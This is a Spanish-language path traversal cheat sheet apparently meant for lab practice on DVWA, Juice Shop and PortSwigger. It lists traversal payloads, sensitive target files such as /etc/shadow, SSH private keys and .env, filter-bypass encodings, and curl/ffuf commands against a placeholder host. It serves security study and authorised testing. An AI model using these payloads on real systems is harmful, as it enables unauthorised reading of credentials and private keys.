<div align="center">

# 📁 Path Traversal
### Lectura Arbitraria de Archivos del Sistema

![Status](https://img.shields.io/badge/Status-Active-ff3c6e?style=for-the-badge&logo=statuspage&logoColor=white)
![Category](https://img.shields.io/badge/Category-Path%20Traversal-00d4ff?style=for-the-badge&logo=owasp&logoColor=white)
![Tool](https://img.shields.io/badge/Main%20Tool-Caido-00ff88?style=for-the-badge)

</div>

---

> **Path Traversal:** el input del usuario se concatena a una ruta base para construir un path de archivo. Inyectando secuencias `../` el atacante navega fuera del directorio raíz y lee archivos arbitrarios del sistema. Ocurre en cualquier lenguaje/framework que pase input del usuario a funciones del sistema de archivos (`open`, `readFile`, `fopen`, `include`) sin canonicalización y validación contra el path base.

> [!WARNING]
> **Aviso Legal y Ético:** Uso exclusivo en entornos con **autorización explícita por escrito (RoE).** El uso no autorizado constituye un delito penal.

---

## 📑 Tabla de Contenidos

| # | Sección |
|---|---------|
| 01 | [🎯 Labs Objetivo](#-labs-objetivo) |
| 02 | [🛠️ Herramientas](#️-herramientas) |
| 03 | [🔍 Parámetros Sospechosos](#-parámetros-sospechosos) |
| 04 | [🧪 Payloads Base](#-payloads-base) |
| 05 | [🧱 Archivos Objetivo](#-archivos-objetivo) |
| 06 | [🛡️ Bypass de Filtros](#️-bypass-de-filtros) |
| 07 | [🔁 Flujo con Caido](#-flujo-con-caido) |
| 08 | [⚙️ Comandos Útiles](#️-comandos-útiles) |
| 09 | [🧭 Ruta de Práctica](#-ruta-de-práctica) |
| 10 | [📝 Checklist](#-checklist) |

---

## 🎯 Labs Objetivo

| Plataforma | Labs recomendados |
|-----------|-------------------|
| **DVWA** | File Inclusion |
| **Juice Shop** | Local File Read |
| **PortSwigger** | Path traversal |

---

## 🛠️ Herramientas

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-ffuf-ff6b00?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-curl-00d4ff?style=flat-square)

| Herramienta | Uso |
|-------------|-----|
| **Caido** | `Replay`, `Automate` |
| **ffuf** | Fuzzing automático de rutas y variantes |
| **curl** | Reproducción rápida de payloads |

---

## 🔍 Parámetros Sospechosos

![Context](https://img.shields.io/badge/Detección-Parámetros-ff6b00?style=flat-square)

Parámetros con nombres que sugieren manejo de archivos:

- `file=`, `page=`, `path=`
- `template=`, `download=`
- `img=`, `folder=`, `document=`
- `include=`, `load=`, `view=`

> [!TIP]
> Buscar en `HTTP History` requests con extensiones de archivo en el valor: `.html`, `.php`, `.png`, `.pdf`. Candidatos directos.

---

## 🧪 Payloads Base

![Context](https://img.shields.io/badge/Payload-Traversal%20Sequences-a855f7?style=flat-square)

### `[01]` Básico

```text
../
../../
../../../
../../../../etc/passwd
../../../../etc/hosts
../../../../../etc/shadow
../../../../windows/win.ini
../../../../windows/system32/drivers/etc/hosts
```

### `[02]` Con depth variable

```text
./././././etc/passwd
../././../././etc/passwd
```

### `[03]` Path absoluto (cuando no hay base prepend)

```text
/etc/passwd
/etc/shadow
/proc/self/environ
C:\Windows\win.ini
```

---

## 🧱 Archivos Objetivo

![Context](https://img.shields.io/badge/Targets-Linux%20%26%20Windows-00d4ff?style=flat-square)

### Linux

```text
/etc/passwd                    # usuarios del sistema
/etc/shadow                    # hashes de passwords
/etc/hosts                     # resolución local
/etc/hostname                  # nombre del host
/etc/os-release                # distribución
/etc/crontab                   # tareas programadas
/proc/self/environ             # variables de entorno del proceso
/proc/self/cmdline             # comando de inicio del proceso
/proc/version                  # versión del kernel
/proc/net/tcp                  # conexiones TCP activas
/var/log/apache2/access.log    # logs Apache (útil para log poisoning)
/var/log/nginx/access.log      # logs Nginx
/home/[user]/.ssh/id_rsa       # clave privada SSH
/home/[user]/.bash_history     # historial de comandos
/var/www/html/.env             # variables de entorno de la app
/var/www/html/config.php       # configuración con credenciales
```

### Windows

```text
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM   # requiere privilegios
c:\windows\repair\sam
C:\inetpub\wwwroot\web.config
C:\inetpub\wwwroot\global.asax
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\Users\Administrator\.ssh\id_rsa
```

---

## 🛡️ Bypass de Filtros

![Context](https://img.shields.io/badge/Bypass-Encoding%20%26%20Obfuscación-ff3c6e?style=flat-square)

### URL encoding

```text
%2e%2e%2f          = ../
%2e%2e%5c          = ..\
..%2f              = ../  (partial encode)
%252e%252e%252f    = ../  (double encode)
%255c%255c         = \\   (double encode backslash)
```

### Unicode / UTF-8 overlong

```text
%u002e%u002e/             (Unicode)
%c0%ae%c0%af              (overlong UTF-8 para ../)
%e0%40%ae                 (overlong alternativo)
%c0%5c                    (overlong backslash)
```

### Secuencias cuando `../` es stripped

```text
....//             (se resuelve a ../ tras strip simple)
....\/
..././
..%00/
.%00./.%00./
```

### Null byte (PHP < 5.3.4)

```text
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd\x00.png
```

### Windows específico

```text
..\..\windows\win.ini
..%5c..%5cwindows%5cwin.ini
\\localhost\c$\windows\win.ini
shell.php::$DATA                (NTFS Alternate Data Stream)
```

### Nginx/Tomcat reverse proxy

```text
..;/
/..;/
/app/..;/admin/
```

> [!NOTE]
> Probar payload sin encode primero. Si bloqueado → URL encode → doble encode → Unicode. Un error diferente al normal ya indica impacto.

---

## 🔁 Flujo con Caido

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)

### `[01]` Capturar request

Localizar request con nombre de archivo o ruta en parámetro.

### `[02]` Establecer baseline

Verificar que el archivo legítimo carga correctamente.

### `[03]` Sustituir por payload

```text
../../../../etc/passwd
```

### `[04]` Revisar respuesta

Buscar en body:

- contenido de `/etc/passwd` (Linux)
- contenido de `win.ini` (Windows)
- errores de path del servidor

### `[05]` Automate con wordlist

```text
../../../../etc/passwd
../../../../etc/hosts
../../../../etc/shadow
../../../../../etc/passwd
..\..\..\..\windows\win.ini
/etc/passwd
```

> [!IMPORTANT]
> Si el servidor devuelve error genérico, probar variantes encoded. Un error diferente al normal ya indica que el path se está procesando.

---

## ⚙️ Comandos Útiles

![Tool](https://img.shields.io/badge/Tool-curl-00d4ff?style=flat-square)

```bash
curl -i "http://target/image?filename=../../../../etc/passwd"
curl -i "http://target/image?filename=..%2f..%2f..%2f..%2fetc%2fpasswd"
```

![Tool](https://img.shields.io/badge/Tool-ffuf-ff6b00?style=flat-square)

```bash
ffuf -u "http://target/load?file=FUZZ" -w traversal.txt
```

---

## 🧭 Ruta de Práctica

1. DVWA File Inclusion
2. PortSwigger: simple path traversal
3. PortSwigger: stripped traversal sequences
4. PortSwigger: superfluous URL decode
5. Juice Shop: local file read

---

## 📝 Checklist

- [ ] parámetro de archivo controlado identificado
- [ ] path base del servidor inferido
- [ ] bypass de encoding probado
- [ ] archivo sensible leído en lab

---

## 🔗 Referencias

- [PortSwigger Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [PayloadsAllTheThings — Path Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Path%20Traversal)
